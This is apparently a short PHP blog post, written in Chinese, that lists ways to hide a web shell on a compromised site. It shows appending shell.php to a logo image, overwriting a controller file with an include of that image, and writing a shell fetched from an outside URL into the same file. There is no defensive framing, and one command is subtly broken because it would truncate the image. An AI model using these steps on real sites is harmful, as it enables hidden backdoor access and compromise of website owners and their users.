---
layout: post
tags: [php]
---

```php
<?php
    把shell添加到网站logo图片里:

    cat logo.png shell.php > logo.png
    

    在网站任意一个php文件里添加下面的最简单方法:

    fputs(fopen('/home/www/html/orderpost/Ordernk/Home/Controller/EncryptController.classs.php','w'),'<?php include "upload/logo.png";?>');
    

    还可以下载远程的shell:

    fputs(fopen('/home/www/html/orderpost/Ordernk/Home/Controller/EncryptController.classs.php','w'),file_get_contents('http://www.0668sec.info/utf8.txt'));
?>
```